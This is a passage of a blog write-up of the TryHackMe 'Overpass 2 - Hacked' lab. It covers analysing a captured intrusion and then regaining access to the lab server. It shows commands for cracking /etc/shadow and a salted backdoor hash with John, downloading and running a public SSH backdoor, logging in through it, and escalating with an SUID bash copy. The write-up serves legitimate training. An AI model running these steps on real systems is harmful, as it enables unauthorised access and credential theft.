<h3 id="14-how-did-the-attacker-establish-persistence">1.4 How did the attacker establish persistence?</h3>
<p>Still in the same stream, scrolling down reveals that the attacker has downloaded an ssh backdoor to establish persistence.</p>

<p><img src="/assets/img/tryhackme/overpass-2/git.png" alt="git"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">https://github.com/NinjaJc01/ssh-backdoor</code></strong></p>

<p><br></p>
<h3 id="15-using-the-fasttrack-wordlist-how-many-of-the-system-passwords-were-crackable">1.5 Using the fasttrack wordlist, how many of the system passwords were crackable?</h3>
<p>In the same stream, the attacker dumped the content of the <strong><code class="language-plaintext highlighter-rouge">/etc/shadow</code></strong> file just before downloading the SSH backdoor.</p>

<p><img src="/assets/img/tryhackme/overpass-2/hosts.png" alt="hosts"></p>

<p>Save the content in a file and crack it with <strong><code class="language-plaintext highlighter-rouge">John</code></strong> against the <strong><code class="language-plaintext highlighter-rouge">fasttrack</code></strong> wordlist to confirm how many passwords are crackable.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlist/fasttrack.txt shadow.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/shadow.png" alt="shadow"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">4</code></strong></p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="2-research---analyse-the-code">2. Research - Analyse the Code</h2>
<p>Now that you’ve found the code for the backdoor, it’s time to analyse it.
<br></p>
<h3 id="21-whats-the-default-hash-for-the-backdoor">2.1 What’s the default hash for the backdoor?</h3>

<p>Still, in the same stream, we see that the attacker executes the backdoor with the <code class="language-plaintext highlighter-rouge">-a</code> option, along with a <code class="language-plaintext highlighter-rouge">hash</code>.</p>

<p><img src="/assets/img/tryhackme/overpass-2/back.png" alt="back"></p>

<p>What does the -a option do? Let’s download the backdoor locally and check ourselves what this option is.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/NinjaJc01/ssh-backdoor/raw/master/backdoor
$ chmod +x backdoor 
$ ./backdoor -h
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/door.png" alt="door"></p>

<p>As you can see here, if no hash is entered in the -a option, the tool itself uses a default hash.</p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3</code></strong></p>

<p><br></p>
<h3 id="22-whats-the-hardcoded-salt-for-the-backdoor">2.2 What’s the hardcoded salt for the backdoor?</h3>
<p>Reading the source code of the backdoor <a href="https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go">https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go</a>, reveals that the salt is hardcoded.</p>

<p><img src="/assets/img/tryhackme/overpass-2/salt.png" alt="salt"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">1c362db832f3f864c8c2fe05f2002a05</code></strong></p>

<p><br></p>
<h3 id="23-what-was-the-hash-that-the-attacker-used---go-back-to-the-pcap-for-this">2.3 What was the hash that the attacker used? - Go back to the PCAP for this!</h3>
<p>We saw previously that the attacker used a custom hash.</p>

<p><img src="/assets/img/tryhackme/overpass-2/door.png" alt="door"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</code></strong></p>

<p><br></p>
<h3 id="24-crack-the-hash-using-rockyou-and-a-cracking-tool-of-your-choice-whats-the-password">2.4 Crack the hash using rockyou and a cracking tool of your choice. What’s the password?</h3>

<p>Analyzing the source code, we can see that the password is salted as follows.</p>

<p><img src="/assets/img/tryhackme/overpass-2/sha.png" alt="sha"></p>

<p>The salt is appended to the password, and SHA512 of the resulting string makes the hash.
We create hash.txt and paste the following into it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/cat.png" alt="cat"></p>

<p>Now, let’s crack it with john. As a format, we use <code class="language-plaintext highlighter-rouge">(sha512($pass.$salt))</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --format='dynamic=sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/hash.png" alt="hash"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">********</code></strong></p>

<p><br></p>

<hr>

<p><br></p>

<h2 id="3-attack---get-back-in">3. Attack - Get back in!</h2>
<p>Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.</p>

<p>There’s flags on the box that Overpass can’t afford to lose by formatting the server!</p>

<p><br></p>
<h3 id="31-the-attacker-defaced-the-website-what-message-did-they-leave-as-a-heading">3.1 The attacker defaced the website. What message did they leave as a heading?</h3>
<p>Let’s do an nmap scan.</p>

<p><img src="/assets/img/tryhackme/overpass-2/nmap.png" alt="nmap"></p>

<p>As we see here, 3 ports are open. One is <strong><code class="language-plaintext highlighter-rouge">HTTP:80</code></strong> and the others are <strong><code class="language-plaintext highlighter-rouge">SSH:22</code></strong>, <strong><code class="language-plaintext highlighter-rouge">SSH:2222</code></strong>.
Connect to port 80. The index page shows the following message.</p>

<p><img src="/assets/img/tryhackme/overpass-2/message.png" alt="message"></p>

<p><strong>Answer: <code class="language-plaintext highlighter-rouge">H4ck3d by CooctusClan</code></strong></p>

<p><br></p>
<h3 id="32-using-the-information-youve-found-previously-hack-your-way-back-in">3.2 Using the information you’ve found previously, hack your way back in!</h3>
<p>It appears port 2222 is open. Logging in with the password cracked earlier. (november 16)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh 10.10.128.157 -p 2222 -oHostKeyAlgorithms=+ssh-rsa
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/ssh.png" alt="ssh"></p>

<p><br></p>
<h3 id="33-whats-the-user-flag">3.3 What’s the user flag?</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/james/user.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/user.png" alt="user"></p>

<p><br></p>
<h3 id="34-whats-the-root-flag">3.4 What’s the root flag?</h3>
<p>There is a copy of bash in James’s home directory.</p>

<p><img src="/assets/img/tryhackme/overpass-2/bash.png" alt="bash"></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./.suid_bash -p 
$ cat /root/root.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass-2/root.png" alt="root"></p>

<p><img src="/assets/img/tryhackme/overpass-2/root-flag.png" alt="root-flag"></p>

<p><br></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

<p><br></p>

  </div>
  <div class="post__footer">
    <p class="post__date">
      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 09, 2023</p>
    <div class="post__categories">
      
      
      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
            
    </div>      
    
    <div class="post__tags">
      <p class="post__tags-title">
        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
        <span class="post__tags-container">
          
          <span class="post__tags-item">security,</span>
          
          <span class="post__tags-item">forensics,</span>
          
          <span class="post__tags-item">wireshark</span>
          
        </span>
      </p>
    </div>
    
  </div>
</div>
<br>
<!-- Twitter Share Button -->
<a href="https://twitter.com/intent/tweet?text=Tryhackme%20-%20Overpass%202%20-%20Hacked&url=http://localhost:4000/tryhackme-overpass-2-hacked/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
    Tweet
</a>
  
<!-- LinkedIn Share Button -->
<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-overpass-2-hacked/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
    LinkedIn
</a>
  
  

<br>


<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    this.page.url = 'http://localhost:4000/tryhackme-overpass-2-hacked/';
    this.page.identifier = '/tryhackme-overpass-2-hacked';
    
    };

    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript>



        </main>
      </div>
    </div>




    <button onclick="topFunction()" id="myBtn" title="Go to top"><i class="fas fa-chevron-circle-up fa-2x"></i></button>
    <footer>
  <div class="footer">
    © Copyright 2025 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a>
  </div>
</footer>

    <!-- script -->
    <script src="/assets/js/nav.js"></script>
    <script src="/assets/js/clip.js"></script>
    <script src="/assets/js/scroll-top.js"></script>
    <script src="/assets/js/search.js"></script>
    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "Tryhackme - Overpass 2 - Hacked",
    "author": {
      "@type": "Person",
      "name": ""
    },
    "datePublished": "2023-03-09 00:00:00 +0300",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http://localhost:4000/tryhackme-overpass-2-hacked/"
    },
    "articleSection": "TryHackMe"
  }
</script>
  </body>
</html>
